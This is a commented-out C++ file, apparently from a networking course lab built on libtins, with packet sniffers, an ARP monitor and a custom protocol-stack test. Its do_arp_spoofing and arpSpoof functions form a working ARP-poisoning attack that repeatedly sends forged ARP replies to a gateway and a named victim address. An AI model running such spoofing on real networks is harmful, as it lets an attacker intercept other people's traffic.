//#include <map>
//#include <iostream>
//#include <functional>
//#include <string>
//#include "tins.h"
//#include "Print.h"
//#include "L2.h"
//#include "L3.h"
//#include "L4.h"
//#include "NIC.h"
//#include "L2_ARP.h"
//
//using namespace Tins;
//using namespace std;
//
//bool callback(const PDU &pdu) {
//	const IP &ip = pdu.rfind_pdu<IP>(); // Find the IP layer
//	const TCP &tcp = pdu.rfind_pdu<TCP>(); // Find the TCP layer
//	std::cout << ip.src_addr() << ':' << tcp.sport() << " -> "
//		<< ip.dst_addr() << ':' << tcp.dport() << std::endl;
//	return true;
//}
//
//
//string getInter()
//{
//	pcap_if_t *alldevs;
//	pcap_if_t *d;
//	int inum;
//	int i = 0;
//	char errbuf[PCAP_ERRBUF_SIZE];
//
//	/* Retrieve the device list on the local machine */
//	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
//	{
//		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
//		exit(1);
//	}
//
//	/* Print the list */
//	for (d = alldevs; d; d = d->next)
//	{
//		printf("%d. %s", ++i, d->name);
//		if (d->description)
//			printf(" (%s)\n", d->description);
//		else
//			printf(" (No description available)\n");
//	}
//
//	if (i == 0)
//	{
//		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
//		return "";
//	}
//
//	printf("Enter the interface number (1-%d):", i);
//	scanf_s("%d", &inum);
//
//	if (inum < 1 || inum > i)
//	{
//		printf("\nInterface number out of range.\n");
//		/* Free the device list */
//		pcap_freealldevs(alldevs);
//		return "";
//	}
//
//	/* Jump to the selected adapter */
//	for (d = alldevs, i = 0; i< inum - 1; d = d->next, i++);
//
//	string ret = string(d->name);
//	ret = ret.substr(ret.find("{"));
//
//	/* At this point, we don't need any more the device list. Free it */
//	pcap_freealldevs(alldevs);
//
//	return ret;
//}
//
//
//int main2() {
//	Sniffer(getInter()).sniff_loop(callback);
//	return 0;
//}
//
//
//
//class arp_monitor {
//public:
//	void run(Sniffer &sniffer);
//private:
//	bool callback(const PDU &pdu);
//
//	std::map<IPv4Address, HWAddress<6>> addresses;
//};
//
//void arp_monitor::run(Sniffer &sniffer)
//{
//	sniffer.sniff_loop(
//		std::bind(
//		&arp_monitor::callback,
//		this,
//		std::placeholders::_1
//		)
//		);
//}
//
//
//
//
//
//
//bool arp_monitor::callback(const PDU &pdu)
//{
//	// Retrieve the ICMP layer
//	/*const ICMP &icmp = pdu.rfind_pdu<ICMP>();*/
//	//auto t = ((PDU&) pdu).serialize();
//	//for (auto i = t.begin(); i != t.end(); ++i)
//	//	std::cout << *i << ' ';
//	//cout << endl;
//	PDU * clone = pdu.clone();
//	PDU * test = clone;
//	HexDump(*clone);
//	clone = clone->inner_pdu();
//	HexDump(*clone);
//	HexDump(*test);
//	
//	
//	//// Is it an ICMP reply?
//	//if (icmp.code() == ICMP::ECHO_REPLY) {
//	//	// Let's check if there's already an entry for this address
//	//	auto iter = addresses.find(arp.sender_ip_addr());
//	//	if (iter == addresses.end()) {
//	//		// We haven't seen this address. Save it.
//	//		addresses.insert({ arp.sender_ip_addr(), arp.sender_hw_addr() });
//	//		std::cout << "[INFO] " << arp.sender_ip_addr() << " is at "
//	//			<< arp.sender_hw_addr() << std::endl;
//	//	}
//	//	else {
//	//		// We've seen this address. If it's not the same HW address, inform it
//	//		if (arp.sender_hw_addr() != iter->second) {
//	//			std::cout << "[WARNING] " << arp.sender_ip_addr() << " is at "
//	//				<< iter->second << " but also at " << arp.sender_hw_addr()
//	//				<< std::endl;
//	//		}
//	//	}
//	//}
//	return true;
//}
//
//int arp_monitor_ex()
//{
//	//if (argc != 2) {
//	//	std::cout << "Usage: " << *argv << " <interface>\n";
//	//	return 1;
//	//}
//	arp_monitor monitor;
//	// Sniffer configuration
//	SnifferConfiguration config;
//	config.set_promisc_mode(true);
//	config.set_filter("icmp");
//	
//	// Sniff on the provided interface in promiscuous mode
//	Sniffer sniffer(getInter(), config);
//
//	// Only capture arp packets
//	monitor.run(sniffer);
//
//	return 0;
//}
//
//void main3()
//{
//	arp_monitor_ex();
//}
//
//void do_arp_spoofing(NetworkInterface iface, IPv4Address gw, IPv4Address victim,
//	const NetworkInterface::Info &info)
//{
//	PacketSender sender;
//	EthernetII::address_type gw_hw, victim_hw;
//
//	// Resolves gateway's hardware address.
//	gw_hw = Utils::resolve_hwaddr(iface, gw, sender);
//
//	// Resolves victim's hardware address.
//	victim_hw = Utils::resolve_hwaddr(iface, victim, sender);
//
//	// Print out the hw addresses we're using.
//	cout << " Using gateway hw address: " << gw_hw << "\n";
//	cout << " Using victim hw address:  " << victim_hw << "\n";
//	cout << " Using own hw address:     " << info.hw_addr << "\n";
//
//	/* We tell the gateway that the victim is at out hw address,
//	* and tell the victim that the gateway is at out hw address */
//	ARP gw_arp(gw, victim, gw_hw, info.hw_addr),
//		victim_arp(victim, gw, victim_hw, info.hw_addr);
//	// We are "replying" ARP requests
//	gw_arp.opcode(ARP::REPLY);
//	victim_arp.opcode(ARP::REPLY);
//
//	/* The packet we'll send to the gateway and victim.
//	* We include our hw address as the source address
//	* in ethernet layer, to avoid possible packet dropping
//	* performed by any routers. */
//	EthernetII to_gw = EthernetII(gw_hw, info.hw_addr) / gw_arp;
//	EthernetII to_victim = EthernetII(victim_hw, info.hw_addr) / victim_arp;
//	while (true) {
//		// Just send them once every 5 seconds.
//		sender.send(to_gw, iface);
//		sender.send(to_victim, iface);
//		Sleep(5000);
//	}
//}
//
//int arpSpoof() {
//	IPv4Address gw, victim;
//	EthernetII::address_type own_hw;
//	try {
//		// Convert dotted-notation ip addresses to integer. 
//		gw = "10.0.0.138";
//		victim = "10.0.0.2";
//	}
//	catch (...) {
//		cout << "Invalid ip found...\n";
//		return 2;
//	}
//
//	NetworkInterface iface;
//	NetworkInterface::Info info;
//	try {
//		// Get the interface which will be the gateway for our requests.
//		iface = gw;
//		// Lookup the interface id. This will be required while forging packets.
//		// Find the interface hardware and ip address.
//		info = iface.addresses();
//	}
//	catch (std::runtime_error &ex) {
//		cout << ex.what() << endl;
//		return 3;
//	}
//	try {
//		do_arp_spoofing(iface, gw, victim, info);
//	}
//	catch (std::runtime_error &ex) {
//		std::cout << "Runtime error: " << ex.what() << std::endl;
//		return 7;
//	}
//	return 0;
//}
//
//int main() 
//{
//	L2_ARP* arp = new L2_ARP(10, 10000, true);
//	NIC* nic = new NIC(true);
//	//EthernetInter* etherInter = new EthernetInter();
//	L2 * Datalink = new L2(true);
//	nic->setUpperInterface(Datalink);
//	nic->setNICsARP(arp);
//	arp->setNIC(nic);
//	Datalink->setNIC(nic);
//
//	nic->connect(0U, true);
//
//	L3 * Network = new L3(true);
//	L4 * Transport = new L4(true);
//
//	Datalink->setUpperInterface(Network);
//	Network->setUpperInterface(Transport);
//	Network->setLowerInterface(Datalink);
//	Transport->setLowerInterface(Network);
//	
//	char * test = { "NetlabPingPongTest!\n" };
//	size_t testLen = string(test).length();
//
//	/* Default remote server, can be changed using command arguments */
//	/*string dstIP = "www.google.com";*/
//	//string dstIP = "74.125.21.103";
//	string dstIP = "74.125.21.105";
//
//	/* L4 tries to resolves destination IP address, if it can't it passes NULL string to L3.*/
//	Transport->sendToL4((byte *)test, testLen, dstIP, "");
//	byte* readData = new byte[testLen];
//
//	testLen = Transport->readFromL4(readData, testLen);
//	pthread_mutex_lock(&NIC::print_mutex);
//	cout << string((char*)readData, testLen) << endl;
//	pthread_mutex_unlock(&NIC::print_mutex);
//
//	return testLen;
//	//// We'll use the default interface(default gateway)
//	//NetworkInterface iface = NetworkInterface::default_interface();
//
//	///* Retrieve this structure which holds the interface's IP,
//	//* broadcast, hardware address and the network mask.
//	//*/
//	//NetworkInterface::Info info = iface.addresses();
//
//	//IPv4Address source = IPv4Address(info.ip_addr);
//	//string sIP = source.to_string();
//	//IP ip = IP("216.58.210.68", sIP);
//
//	//ip /= ICMP();
//	//ip /= RawPDU("NetlabPingPongTest!\n");
//	//HexDump(ip);
//	//byte *toSend = new byte[ip.size()];
//
//	//RawData(ip, toSend, ip.size());
//
//	//Datalink->sendToL2(toSend, ip.size(), true);
//	//
//	
//	///* Create an Ethernet II PDU which will be sent to
//	//* 77:22:33:11:ad:ad using the default interface's hardware
//	//* address as the sender.
//	//*/
//	//EthernetII eth("77:22:33:11:ad:ad", info.hw_addr);
//	//HexDump(eth);
//
//
//	//size_t lSize = eth.size();
//	//uint8_t *raw = new uint8_t[lSize];
//
//	//RawData(eth, raw, lSize);
//	//EthernetII ethFromBuf = EthernetII(raw, lSize);
//	//delete[] raw;
//	//HexDump(ethFromBuf);
//
//	///* Create an IP PDU, with 192.168.0.1 as the destination address
//	//* and the default interface's IP address as the sender.
//	//*/
//
//	//IPv4Address source = IPv4Address(info.ip_addr);
//	//string sIP = source.to_string();
//	//IP ip = IP("192.168.0.1", sIP);
//	//HexDump(ip);
//	//
//	//lSize = ip.size();
//	//raw = new uint8_t[lSize];
//	//RawData(ip, raw, lSize);
//	//IP ipFromBuf = IP(raw, lSize);
//	//delete[] raw;
//	//HexDump(ipFromBuf);
//	//eth /= ip;
//
//	///* Create a TCP PDU using 13 as the destination port, and 15
//	//* as the source port.
//	//*/
//
//	//eth /= TCP(13, 15);
//
//	///* Create a RawPDU containing the string "I'm a payload!".
//	//*/
//	//eth /= RawPDU("I'm a payload!");
//
//	//PDU* t = eth.clone();
//	//
//	//
//	//
//	//// The actual sender
//	//PacketSender sender;
//
//	//// Send the packet through the default interface
//	//sender.send(eth, iface);
//}
